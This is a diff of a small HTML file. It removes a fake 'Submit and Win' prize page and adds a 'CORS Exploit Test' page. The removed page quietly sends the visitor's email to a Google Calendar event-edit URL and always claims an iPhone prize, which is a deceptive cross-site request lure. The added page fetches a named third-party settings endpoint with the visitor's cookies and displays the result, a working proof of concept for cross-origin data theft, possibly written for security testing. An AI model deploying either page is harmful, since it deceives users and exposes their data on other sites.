@@ -3,93 +3,31 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Submit and Win</title>
-    <style>
-        body {
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            background-color: #f0f0f0;
-            font-family: Arial, sans-serif;
-        }
-        .container {
-            background-color: #fff;
-            border-radius: 10px;
-            box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
-            padding: 40px;
-            text-align: center;
-            width: 300px;
-        }
-        h2 {
-            color: #333;
-            margin-bottom: 20px;
-        }
-        input[type="email"] {
-            width: 90%;
-            padding: 10px;
-            margin-bottom: 20px;
-            border: 1px solid #ccc;
-            border-radius: 5px;
-            font-size: 14px;
-        }
-        button {
-            background-color: #28a745;
-            color: white;
-            padding: 10px 20px;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
-            font-size: 14px;
-        }
-        button:hover {
-            background-color: #218838;
-        }
-        .success-message {
-            display: none;
-            color: #28a745;
-            margin-top: 20px;
-        }
-    </style>
+    <title>CORS Exploit Test</title>
 </head>
 <body>
-
-    <div class="container">
-        <h2>Enter Your Email</h2>
-        <form id="winForm">
-            <input type="email" id="email" placeholder="Enter your email" required>
-            <button type="submit">Submit</button>
-        </form>
-        <div class="success-message" id="successMessage">
-            <h3>Congratulations! You won an iPhone!</h3>
-        </div>
-    </div>
-
+    <h1>CORS Exploit Test</h1>
+    <button id="fetchData">Fetch Data</button>
+    <pre id="result"></pre>
     <script>
-        document.getElementById('winForm').addEventListener('submit', function(event) {
-            event.preventDefault(); // Prevent form from redirecting or opening a new page
-            var email = document.getElementById('email').value;
-
-            if (email) {
-                // Prepare the URL with the email
-                var calendarUrl = 'https://calendar.google.com/calendar/u/0/r/eventedit?dates=20240906T120000Z/20240906T130000Z&add=' + encodeURIComponent(email);
-
-                // Use AJAX to submit the form without opening the URL
-                var xhr = new XMLHttpRequest();
-                xhr.open('GET', calendarUrl, true);
-                xhr.onload = function() {
-                    if (xhr.status === 200) {
-                        // Show the success message if the request is successful
-                        document.getElementById('successMessage').style.display = 'block';
-                    }
-                };
-                xhr.send();
-
-                // Simulate success message regardless of the actual submission
-                document.getElementById('successMessage').style.display = 'block';
-            }
+        document.getElementById('fetchData').addEventListener('click', function() {
+            fetch('https://settings.luckyorange.com/9145dfbd', {
+                method: 'GET',
+                credentials: 'include' // Include cookies if necessary
+            })
+            .then(response => {
+                if (!response.ok) {
+                    throw new Error('Network response was not ok ' + response.statusText);
+                }
+                return response.json();
+            })
+            .then(data => {
+                document.getElementById('result').innerText = JSON.stringify(data, null, 2);
+            })
+            .catch(error => {
+                document.getElementById('result').innerText = 'Error: ' + error;
+            });
         });
     </script>
-
 </body>
 </html>
